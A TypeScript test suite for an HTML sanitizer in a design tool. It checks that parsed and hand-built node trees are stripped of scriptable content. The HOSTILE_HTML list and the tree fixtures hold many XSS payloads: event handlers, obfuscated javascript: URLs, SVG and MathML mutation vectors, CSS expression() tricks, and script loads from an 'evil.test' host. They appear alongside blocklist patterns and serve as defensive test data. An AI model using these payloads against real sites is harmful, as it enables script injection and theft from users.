import { describe, expect, test } from "bun:test";
import { type DefaultTreeAdapterTypes as P5, parseFragment } from "parse5";
import { parseStyle } from "./css.ts";
import type { Op } from "./doc.ts";
import { el, SAMPLE_OPS, text, VARIANTS } from "./fixtures/ops.ts";
import { type Random, random } from "./fixtures/random.ts";
import { parseHtml, serializeNode, serializeNodes } from "./html.ts";
import { sanitizeNode, sanitizeNodes, sanitizeOp } from "./sanitize.ts";
import { walk } from "./tree.ts";
import type { Dropped, PElement, PNode } from "./types.ts";

/**
 * HTML as nodes with no rule applied: what a client that skipped the parser could put in an
 * op. Only the tree's shape comes from parse5.
 */
function rawNodes(html: string): PNode[] {
  let made = 0;
  const convert = (list: P5.ChildNode[]): PNode[] => {
    const out: PNode[] = [];
    for (const child of list) {
      if (child.nodeName === "#text") {
        const value = (child as P5.TextNode).value;
        const prev = out.at(-1);
        if (prev?.kind === "text") prev.value += value;
        else out.push({ kind: "text", value });
      }
      if (!("tagName" in child)) continue;
      const node = el(`r_${made++}`, child.tagName);
      for (const a of child.attrs) {
        const key = a.prefix ? `${a.prefix}:${a.name}` : a.name;
        if (key === "style") node.style = parseStyle(a.value);
        else if (key === "data-name" || key === "layer-name") node.name = a.value;
        else if (key !== "data-id") node.attrs[key] = a.value;
      }
      if (child.namespaceURI.endsWith("svg")) node.ns = "svg";
      if (child.namespaceURI.endsWith("MathML")) node.ns = "math";
      node.children = convert(child.childNodes);
      out.push(node);
    }
    return out;
  };
  return convert(parseFragment(html).childNodes);
}

function elements(nodes: PNode[]): PElement[] {
  return nodes.flatMap((n) => (n.kind === "el" ? [...walk(n)].map((w) => w.node) : []));
}

const what = (dropped: Dropped[]) => dropped.map((d) => d.what);

const PAYLOAD = "<img src=x onerror=alert(1)>";

/** HTML an attacker would write. Every line goes through every check below. */
const HOSTILE_HTML = [
  "<script>alert(1)</script>",
  "<SCRIPT SRC=//evil.test/x.js></SCRIPT>",
  '<script type="module">import("//evil.test/x.js")</script>',
  '<p>ok<script type="ponzu/act" src="evil.js" onload="x()">move @A</script></p>',
  '<script type=" Ponzu/Act ">click @B</script>',
  "<img src=x onerror=alert(1)>",
  '<img src="x" OnErRoR="alert(1)">',
  '<img src="javascript:alert(1)">',
  '<div onclick="a()" ONMOUSEOVER=b() onfocus=c() tabindex=0>x</div>',
  "<input onfocus=alert(1) autofocus>",
  "<details open ontoggle=alert(1)>x</details>",
  "<body onload=alert(1)>",
  '<a href="javascript:alert(1)">x</a>',
  '<a href="  JaVaScRiPt:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="java&#10;script:alert(1)">x</a>',
  '<a href="&#x1;javascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="#" onclick="alert(1)" style="color:red">x</a>',
  '<form action="javascript:alert(1)"><button formaction="javascript:alert(2)">x</button></form>',
  '<video poster="javascript:alert(1)" onloadstart="alert(2)"><source onerror="alert(3)"></video>',
  '<link rel="stylesheet" href="javascript:alert(1)">',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<div srcdoc="<script>alert(1)</script>">x</div>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<base href="javascript:alert(1)//">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  "<template><script>alert(1)</script></template>",
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<frameset onload=alert(1)><frame src="javascript:alert(1)"></frameset>',
  '<applet code="x"></applet>',
  '<portal src="https://evil.test"></portal>',
  "<svg onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  '<svg><script href="data:,alert(1)"/></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text y=20>x</text></a></svg>',
  '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>',
  "<svg><a><animate attributeName=href values=javascript:alert(1) /><text>x</text></a></svg>",
  '<svg><a><animate attributeName=href values="#a; javascript:alert(1)" /></a></svg>',
  '<svg><a><set attributeName="href" to="javascript:alert(1)"/></a></svg>',
  '<svg><animate attributeName="href" from="javascript:alert(1)" by="vbscript:x" to="#"/></svg>',
  '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>',
  "<svg><desc><script>alert(1)</script></desc></svg>",
  "<svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg>",
  '<svg><script type="ponzu/act">&lt;img src=x onerror=alert(1)&gt;</script></svg>',
  "<svg><title><img src=x onerror=alert(1)></title></svg>",
  '<svg><p><style><a title="</style><img src=x onerror=alert(1)>">',
  "<math><style>&lt;img src=x onerror=alert(1)&gt;</style></math>",
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
  '<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">x</maction></math>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  "<div style=\"background:url('java\tscript:alert(1)')\">x</div>",
  '<div style="width:expression(alert(1))">x</div>',
  '<div style="color:red;background-image:url(&quot;vbscript:x&quot;);margin:0">x</div>',
  '<div style="a b:1;color:red">x</div>',
  '<style>@import "javascript:alert(1)";</style>',
  "<style>a{b:expression(alert(1))}</style>",
  "<style>a{b:javajavascript:script:alert(1)}</style>",
  "<style>a{b:expressexpression(ion(alert(1))}</style>",
  '<style>a{background:url( "java\nscript:alert(1)" )}</style>',
  "<style></style><img src=x onerror=alert(1)>",
  "<textarea></textarea><img src=x onerror=alert(1)>",
  "<title></title><img src=x onerror=alert(1)>",
  "<xmp><img src=x onerror=alert(1)></xmp>",
  "<plaintext><img src=x onerror=alert(1)>",
  "<select><style></select><img src=x onerror=alert(1)></style></select>",
  "<table><style></table><img src=x onerror=alert(1)></style></table>",
  "<div data-id='x\" onclick=\"alert(1)'>x</div>",
  "<div data-name='\"><script>alert(1)</script>'>x</div>",
  '<div =onclick=alert(1) a"b=1 <c=2>x</div>',
];

describe("the parser and the node sanitizer apply one set of rules", () => {
  test.each(HOSTILE_HTML)("%s", (html) => {
    const parsed = parseHtml(html);
    const dropped: Dropped[] = [];
    const sanitized = sanitizeNodes(rawNodes(html), dropped);

    // The same nodes, and the same account of what went.
    const written = serializeNodes(sanitized, { omitIds: true });
    expect(written).toBe(serializeNodes(parsed.nodes, { omitIds: true }));
    expect(what(dropped)).toEqual(what(parsed.dropped));

    // Sanitizing again finds nothing, and changes nothing.
    const again: Dropped[] = [];
    expect(sanitizeNodes(sanitized, again)).toEqual(sanitized);
    expect(again).toEqual([]);

    // Written out and read back, there is nothing left for the rules to remove, and no
    // element that wasn't a node: every one still carries the id it was written with.
    const back = parseHtml(serializeNodes(sanitized));
    expect(back.dropped).toEqual([]);
    expect(back.assigned.size).toBe(0);
  });

  test("nothing in the corpus survives as something a browser would run", () => {
    for (const html of HOSTILE_HTML) {
      const nodes = sanitizeNodes(rawNodes(html));
      for (const node of elements(nodes)) {
        const blocked =
          /^(noscript|iframe|frame|frameset|object|embed|applet|base|meta|template|portal)$/i;
        expect(node.tag).not.toMatch(blocked);
        if (node.tag === "script") expect(node.attrs).toEqual({ type: "ponzu/act" });
        for (const [name, value] of Object.entries(node.attrs)) {
          expect(name).not.toMatch(/^on|^srcdoc$|[\s=/>"'<]/i);
          expect(value.replace(/[\u0000- ]/g, "")).not.toMatch(/^(java|vb)script:/i);
        }
        for (const value of Object.values(node.style))
          expect(value).not.toMatch(/script:|expression\(/i);
      }
    }
  });
});

describe("what the rules remove", () => {
  test("says what went, in the words a tool result uses", () => {
    const dropped: Dropped[] = [];
    const nodes = sanitizeNodes(
      rawNodes(
        `<div onclick="x()" style="color:red;background:url(javascript:x)"><script>alert(1)</script><a href=" javascript:alert(1)" srcdoc="x">hi</a><iframe src="x"></iframe><style>a{b:expression(1)}</style><svg><animate to="javascript:x"/></svg></div>`,
      ),
      dropped,
    );
    expect(serializeNodes(nodes, { omitIds: true })).toBe(
      '<div style="color:red"><a>hi</a><style>a{b:x(1)}</style><svg><animate/></svg></div>',
    );
    expect(what(dropped)).toEqual([
      "onclick on <div>",
      "script in background on <div>",
      "<script>",
      "javascript: URL in href on <a>",
      "srcdoc on <a>",
      "<iframe>",
      "script inside <style>",
      "javascript: URL in to on <animate>",
    ]);
  });

  test("leaves what is safe exactly as it was, down to the order of keys", () => {
    const { nodes } = parseHtml(
      `<section style="display:grid;gap:8px" class="a b" data-name="Card"><h1>Title</h1><a href="https://ponzu.design/x?y=1#z">link</a><img src="assets/a.png" srcset="a.png 1x, b.png 2x" alt=""><svg viewBox="0 0 10 10"><title>Icon</title><path d="M0 0h10"/><use href="#a"/><animate attributeName="opacity" values="0;1" to="1"/></svg><style>.a > .b { background: url("a.png"); content: "<b>" }</style><script type="ponzu/act">move @A\nclick</script><textarea>a &lt; b</textarea></section>`,
    );
    const dropped: Dropped[] = [];
    const out = sanitizeNodes(nodes, dropped);
    expect(dropped).toEqual([]);
    expect(JSON.stringify(out)).toBe(JSON.stringify(nodes));
    // A copy, not the same objects: the caller's tree is never handed back to be changed.
    expect(out[0]).not.toBe(nodes[0]);
  });

  test("never changes the tree it was given", () => {
    for (const html of HOSTILE_HTML) {
      const nodes = rawNodes(html);
      const before = JSON.stringify(nodes);
      sanitizeNodes(nodes);
      expect(JSON.stringify(nodes)).toBe(before);
    }
  });

  test("a node that can't stay is null, and a text node always can", () => {
    expect(sanitizeNode(el("n_1", "script"))).toBeNull();
    expect(sanitizeNode(el("n_1", "IFRAME"))).toBeNull();
    const t = text("<script>alert(1)</script>");
    expect(sanitizeNode(t)).toBe(t);
    expect(serializeNode(t)).toBe("&lt;script&gt;alert(1)&lt;/script&gt;");
  });
});

/** Trees no parser would produce: what a hand-written op can carry. All names are well formed. */
function hostileTrees(): Record<string, PNode[]> {
  let made = 0;
  const attr = (tag: string, attrs: Record<string, string>, children: PNode[] = []) => ({
    ...el(`n_a${made++}`, tag, children),
    attrs,
  });
  const ns = (node: PElement, space: "svg" | "math"): PElement => ({ ...node, ns: space });
  return {
    "a script in capitals": [el("n_1", "SCRIPT", [text("alert(1)")])],
    "a scene in mixed case, with a source": [
      attr("ScRiPt", { TYPE: " PONZU/ACT", src: "//evil.test/x.js" }, [text("click @A")]),
    ],
    "a script that says it is SVG": [ns(el("n_1", "script", [text("alert(1)")]), "svg")],
    "a scene that says it is SVG": [
      ns(attr("script", { type: "ponzu/act" }, [text(PAYLOAD)]), "svg"),
    ],
    "blocked elements in capitals": [el("n_1", "IFRAME"), el("n_2", "Object"), el("n_3", "EMBED")],
    "a blocked element deep inside": [
      el("n_1", "div", [el("n_2", "ul", [el("n_3", "li", [el("n_4", "iframe")])])]),
    ],
    "attributes a node keeps elsewhere": [
      attr("div", {
        style: "background:url(javascript:alert(1))",
        "data-id": "n_forged",
        "data-name": "Forged",
        "layer-name": "Forged",
        SRCDOC: "<script>alert(1)</script>",
        ONLOAD: "alert(1)",
        title: "kept",
      }),
    ],
    "script URLs spelled to slip past": [
      attr("a", { href: "\u0001javascript:alert(1)" }),
      attr("a", { HREF: " JAVASCRIPT:alert(1)" }),
      attr("a", { "xlink:href": "java\nscript:alert(1)" }),
      attr("form", { action: "vbscript:x", FormAction: "javascript:x" }),
      ns(attr("animate", { attributeName: "href", values: "#a; javascript:alert(1)" }), "svg"),
    ],
    "script in inline CSS": [
      {
        ...el("n_1", "div"),
        style: {
          color: "red",
          background: "url( 'javascript:alert(1)' )",
          width: "expression(alert(1))",
          "--x": "javascript:alert(1)",
          "background-image": 'url("java\tscript:alert(1)")',
          margin: "0",
        },
      },
    ],
    "script in CSS, split across text nodes": [
      el("n_1", "style", [
        text("a{b:java"),
        text("script:alert(1)}"),
        text("c{d:express"),
        text("ion(1)}"),
      ]),
    ],
    "a style sheet that closes itself": [
      el("n_1", "style", [text(`a{}</style>${PAYLOAD}`), text(`</STYLE >${PAYLOAD}`)]),
    ],
    "a scene that closes itself": [
      attr("script", { type: "ponzu/act" }, [text(`wait 1</script>${PAYLOAD}<!--<script>`)]),
    ],
    "an attribute that closes a textarea": [
      el("n_1", "textarea", [attr("a", { title: `</textarea>${PAYLOAD}` })]),
    ],
    "an attribute that closes a title, an xmp and a style": [
      el("n_1", "title", [attr("a", { title: `</title>${PAYLOAD}` })]),
      el("n_2", "xmp", [attr("b", { title: `</xmp>${PAYLOAD}` })]),
      el("n_3", "style", [attr("i", { title: `</style>${PAYLOAD}` })]),
      el("n_4", "noembed", [attr("u", { title: `</noembed>${PAYLOAD}` })]),
      el("n_5", "noframes", [attr("s", { title: `</noframes>${PAYLOAD}` })]),
    ],
    "a textarea that says it is SVG": [
      ns(el("n_1", "textarea", [attr("a", { title: `</textarea>${PAYLOAD}` })]), "svg"),
    ],
    "an HTML style sheet inside SVG": [
      ns(el("n_1", "svg", [el("n_2", "style", [text(PAYLOAD)])]), "svg"),
    ],
    "an HTML style sheet inside SVG, under an element that claims no namespace": [
      ns(el("n_1", "svg", [el("n_2", "g", [el("n_3", "style", [text(PAYLOAD)])])]), "svg"),
    ],
    "an SVG that claims no namespace": [el("n_1", "svg", [el("n_2", "style", [text(PAYLOAD)])])],
    "a scene inside SVG and MathML": [
      ns(el("n_1", "svg", [attr("script", { type: "ponzu/act" }, [text(PAYLOAD)])]), "svg"),
      ns(el("n_2", "math", [el("n_3", "mi", [el("n_4", "style", [text(PAYLOAD)])])]), "math"),
    ],
    "a style sheet inside a select": [
      el("n_1", "select", [el("n_2", "style", [text(`</select>${PAYLOAD}`)])]),
    ],
  };
}

describe("trees that never were HTML", () => {
  const trees = hostileTrees();
  for (const [name, nodes] of Object.entries(trees)) {
    test(name, () => {
      const known = new Set(elements(nodes).map((n) => n.id));
      const dropped: Dropped[] = [];
      const sanitized = sanitizeNodes(nodes, dropped);
      expect(sanitizeNodes(sanitized)).toEqual(sanitized);

      // Sanitized, written out and read back: nothing for the rules to remove, and no
      // element that wasn't a node.
      const back = parseHtml(serializeNodes(sanitized));
      expect(back.dropped).toEqual([]);
      expect(elements(back.nodes).filter((n) => !known.has(n.id))).toEqual([]);

      // Written out as it is, the way a `move` can leave a design without any op carrying
      // the nodes: text and attribute values still come out as text and attribute values.
      const unsanitized = parseHtml(serializeNodes(nodes));
      expect(elements(unsanitized.nodes).filter((n) => !known.has(n.id))).toEqual([]);
      expect(unsanitized.assigned.size).toBe(0);
    });
  }

  test("each is cleaned as the rules say", () => {
    const html = Object.fromEntries(
      Object.entries(trees).map(([name, nodes]) => [
        name,
        serializeNodes(sanitizeNodes(nodes), { omitIds: true }),
      ]),
    );
    expect(html).toEqual({
      "a script in capitals": "",
      "a scene in mixed case, with a source": '<script type="ponzu/act">click @A</script>',
      "a script that says it is SVG": "",
      "a scene that says it is SVG": `<script type="ponzu/act">${PAYLOAD}</script>`,
      "blocked elements in capitals": "",
      "a blocked element deep inside": "<div><ul><li></li></ul></div>",
      "attributes a node keeps elsewhere": '<div title="kept"></div>',
      "script URLs spelled to slip past":
        '<a></a><a></a><a></a><form></form><animate attributeName="href"></animate>',
      "script in inline CSS": '<div style="color:red;margin:0"></div>',
      "script in CSS, split across text nodes": "<style>a{b:alert(1)}c{d:x(1)}</style>",
      "a style sheet that closes itself": `<style>a{}\\3c /style>${PAYLOAD}\\3c /STYLE >${PAYLOAD}</style>`,
      "a scene that closes itself": `<script type="ponzu/act">wait 1<\\/script>${PAYLOAD}<\\!--<script></script>`,
      "an attribute that closes a textarea": "<textarea></textarea>",
      "an attribute that closes a title, an xmp and a style":
        "<title></title><xmp></xmp><style></style><noembed></noembed><noframes></noframes>",
      "a textarea that says it is SVG": "<textarea></textarea>",
      "an HTML style sheet inside SVG":
        "<svg><style>\\3c img src=x onerror=alert(1)></style></svg>",
      "an HTML style sheet inside SVG, under an element that claims no namespace":
        "<svg><g><style>\\3c img src=x onerror=alert(1)></style></g></svg>",
      "an SVG that claims no namespace":
        "<svg><style>\\3c img src=x onerror=alert(1)></style></svg>",
      "a scene inside SVG and MathML":
        '<svg><script type="ponzu/act">&lt;img src=x onerror=alert(1)&gt;</script></svg><math><mi><style>\\3c img src=x onerror=alert(1)></style></mi></math>',
      "a style sheet inside a select":
        "<select><style>\\3c /select>\\3c img src=x onerror=alert(1)></style></select>",
    });
  });

  test("names that would write more than one name are dropped", () => {
    const dropped: Dropped[] = [];
    const nodes = sanitizeNodes(
      [
        el("n_1", "img src=x onerror=alert(1)"),
        el("n_2", "div><script>alert(1)</script"),
        el("n_3", ""),
        {
          ...el("n_4", "div"),
          attrs: { "x onclick": "alert(1)", "a=b": "1", 'q"': "1", "": "1", ok: "1" },
          style: { "color:red;x": "1", "a b": "1", "": "1", "--ok": "1" },
        },
      ],
      dropped,
    );
    expect(serializeNodes(nodes, { omitIds: true })).toBe('<div ok="1" style="--ok:1"></div>');
    expect(dropped).toHaveLength(10);
  });

  test("an id is written as an attribute value, whatever is in it", () => {
    const node = el('x" onclick="alert(1)', "div", [text("x")]);
    expect(serializeNode(node)).toBe('<div data-id="x&quot; onclick=&quot;alert(1)">x</div>');
    // Read back, an id like that counts as none: the element gets a new one.
    const back = parseHtml(serializeNode(node));
    expect(back.dropped).toEqual([]);
    expect(back.assigned.size).toBe(1);
  });
});

describe("random trees", () => {
  const TAGS = [
    "div",
    "p",
    "span",
    "a",
    "b",
    "img",
    "ul",
    "li",
    "table",
    "tr",
    "td",
    "form",
    "button",
    "select",
    "option",
    "textarea",
    "title",
    "style",
    "script",
    "SCRIPT",
    "xmp",
    "plaintext",
    "noembed",
    "noframes",
    "iframe",
    "object",
    "template",
    "svg",
    "g",
    "path",
    "foreignObject",
    "desc",
    "animate",
    "math",
    "mi",
    "mtext",
    "mglyph",
    "annotation-xml",
    "h1",
    "pre",
    "font",
  ];
  const ATTRS: [string, string][] = [
    ["class", "a b"],
    ["href", "https://ok.test/"],
    ["href", "javascript:alert(1)"],
    ["xlink:href", " JaVaScRiPt:x"],
    ["onclick", "alert(1)"],
    ["ONERROR", "alert(1)"],
    ["srcdoc", PAYLOAD],
    ["title", `</textarea></title></style></xmp></script></select></svg>${PAYLOAD}`],
    ["title", `">${PAYLOAD}`],
    ["type", "ponzu/act"],
    ["type", "text/javascript"],
    ["encoding", "text/html"],
    ["values", "0; javascript:alert(1)"],
    ["style", "color:red"],
    ["data-id", "n_forged"],
    ["color", "red"],
  ];
  const STYLES: [string, string][] = [
    ["color", "red"],
    ["background", "url(javascript:alert(1))"],
    ["background", 'url("a.png")'],
    ["width", "expression(alert(1))"],
    ["content", `"</style>${PAYLOAD}"`],
  ];
  const TEXTS = [
    "plain",
    PAYLOAD,
    `</style>${PAYLOAD}`,
    `</script>${PAYLOAD}`,
    `</textarea>${PAYLOAD}`,
    `</title></xmp></svg></math>${PAYLOAD}`,
    "<!--",
    "-->",
    "a{b:java",
    "script:alert(1)}",
    "]]>",
    "&lt;img src=x onerror=alert(1)&gt;",
    "<![CDATA[",
  ];

  function tree(r: Random, counter: { n: number }, depth: number): PNode {
    if (depth > 4 || r.chance(0.3)) return text(r.pick(TEXTS));
    const node = el(`n_${counter.n++}`, r.pick(TAGS));
    if (r.chance(0.25)) node.ns = r.pick(["svg", "math"] as const);
    for (let i = r.int(3); i > 0; i--) {
      const [name, value] = r.pick(ATTRS);
      node.attrs[name] = value;
    }
    for (let i = r.int(2); i > 0; i--) {
      const [prop, value] = r.pick(STYLES);
      node.style[prop] = value;
    }
    for (let i = r.int(4); i > 0; i--) node.children.push(tree(r, counter, depth + 1));
    return node;
  }

  test("sanitized, each is settled; written out, no payload comes alive", () => {
    const r = random(20261110);
    for (let i = 0; i < 2000; i++) {
      const counter = { n: 0 };
      const nodes = [tree(r, counter, 0), tree(r, counter, 0)];
      const sanitized = sanitizeNodes(nodes);
      const twice: Dropped[] = [];
      expect(sanitizeNodes(sanitized, twice)).toEqual(sanitized);
      expect(twice).toEqual([]);

      // A payload read as markup is an <img src=x> with a handler for the rules to remove.
      // (A parser adds elements of its own to trees like these, so counting them says nothing.)
      const alive = (list: PNode[]) => elements(list).some((n) => n.attrs.src === "x");
      const html = serializeNodes(sanitized);
      const back = parseHtml(html);
      if (back.dropped.length || alive(back.nodes))
        throw new Error(`Tree ${i} came alive:\n${html}\n${what(back.dropped)}`);

      // Nor when the tree is written out as it is: the serializer alone keeps text as text.
      const raw = serializeNodes(nodes);
      if (alive(parseHtml(raw).nodes)) throw new Error(`Tree ${i} came alive unsanitized:\n${raw}`);
    }
  });
});

describe("sanitizeOp", () => {
  const dirty = (id: string): PElement => ({
    ...el(id, "div", [el(`${id}s`, "script", [text("alert(1)")]), text("kept")]),
    attrs: { onclick: "alert(1)", class: "c" },
    style: { color: "red", background: "url(javascript:alert(1))" },
  });
  const clean = (id: string): PElement => ({
    ...el(id, "div", [text("kept")]),
    attrs: { class: "c" },
    style: { color: "red" },
  });

  test("insert, children and artboard.create have their nodes sanitized", () => {
    expect(sanitizeOp({ op: "insert", parent: "n_1", index: 2, nodes: [dirty("n_5")] })).toEqual({
      op: "insert",
      parent: "n_1",
      index: 2,
      nodes: [clean("n_5")],
    });
    expect(
      sanitizeOp({ op: "children", id: "n_1", children: [el("n_6", "iframe"), dirty("n_5")] }),
    ).toEqual({ op: "children", id: "n_1", children: [clean("n_5")] });
    expect(
      sanitizeOp({
        op: "artboard.create",
        page: "pg_1",
        index: 0,
        artboard: { id: "ab_9", name: "A", x: 1, y: 2, root: dirty("ab_9") },
      }),
    ).toEqual({
      op: "artboard.create",
      page: "pg_1",
      index: 0,
      artboard: { id: "ab_9", name: "A", x: 1, y: 2, root: clean("ab_9") },
    });
  });

  test("an artboard whose root can't stay keeps an empty frame of its size", () => {
    const board = (root: PElement): Op => ({
      op: "artboard.create",
      page: "pg_1",
      index: 0,
      artboard: { id: "ab_9", name: "A", x: 0, y: 0, root },
    });
    const frame = { ...el("ab_9", "section"), name: "A", style: { width: "100px" } };
    for (const tag of ["iframe", "script", "SCRIPT"]) {
      const root: PElement = {
        ...el("ab_9", tag, [text("alert(1)")]),
        name: "A",
        attrs: { type: "ponzu/act", src: "x" },
        style: { width: "100px", background: "url(javascript:x)" },
      };
      const dropped: Dropped[] = [];
      const out = sanitizeOp(board(root), dropped);
      expect(out).toEqual(board(frame));
      expect(dropped.length).toBeGreaterThan(0);
      expect(sanitizeOp(out)).toEqual(out);
    }
  });

  test("attrs and style have their maps sanitized, in order", () => {
    const dropped: Dropped[] = [];
    const attrs = sanitizeOp(
      {
        op: "attrs",
        id: "n_1",
        attrs: { z: "1", onclick: "x()", href: "javascript:x", style: "color:red", a: "2" },
      },
      dropped,
    );
    expect(JSON.stringify(attrs)).toBe('{"op":"attrs","id":"n_1","attrs":{"z":"1","a":"2"}}');
    const style = sanitizeOp(
      {
        op: "style",
        id: "n_1",
        style: { "z-index": "1", width: "expression(1)", "--b": "url(vbscript:x)", color: "red" },
      },
      dropped,
    );
    expect(JSON.stringify(style)).toBe(
      '{"op":"style","id":"n_1","style":{"z-index":"1","color":"red"}}',
    );
    expect(what(dropped)).toEqual([
      "onclick",
      "javascript: URL in href",
      "style",
      "script in width",
      "script in --b",
    ]);
  });

  test("tokens have script taken out of their CSS", () => {
    const dropped: Dropped[] = [];
    const css = ":root { --bg: url(javascript:alert(1)); --w: expression(alert(1)); --ink: #111 }";
    expect(sanitizeOp({ op: "tokens", css }, dropped)).toEqual({
      op: "tokens",
      css: ":root { --bg: url(alert(1)); --w: x(alert(1)); --ink: #111 }",
    });
    expect(what(dropped)).toEqual(["script in the tokens"]);
  });

  test("a batch is sanitized all the way down", () => {
    const op: Op = {
      op: "batch",
      ops: [
        { op: "file.rename", name: "X" },
        { op: "batch", ops: [{ op: "insert", parent: "n_1", index: 0, nodes: [dirty("n_5")] }] },
        { op: "tokens", css: "a{b:javascript:x}" },
      ],
    };
    expect(sanitizeOp(op)).toEqual({
      op: "batch",
      ops: [
        { op: "file.rename", name: "X" },
        { op: "batch", ops: [{ op: "insert", parent: "n_1", index: 0, nodes: [clean("n_5")] }] },
        { op: "tokens", css: "a{b:x}" },
      ],
    });
  });

  test("every variant: a clean op is unchanged, sanitizing settles at once, the input is left alone", () => {
    const carriers = new Set<Op["op"]>([
      "insert",
      "children",
      "attrs",
      "style",
      "artboard.create",
      "tokens",
      "batch",
    ]);
    for (const variant of VARIANTS) {
      const op = SAMPLE_OPS[variant];
      const before = JSON.stringify(op);
      const dropped: Dropped[] = [];
      const out = sanitizeOp(op, dropped);
      expect(dropped).toEqual([]);
      expect(JSON.stringify(out)).toBe(before);
      expect(JSON.stringify(op)).toBe(before);
      // Nothing to sanitize in the rest, so they aren't even copied.
      if (!carriers.has(variant)) expect(out).toBe(op);
    }
  });
});
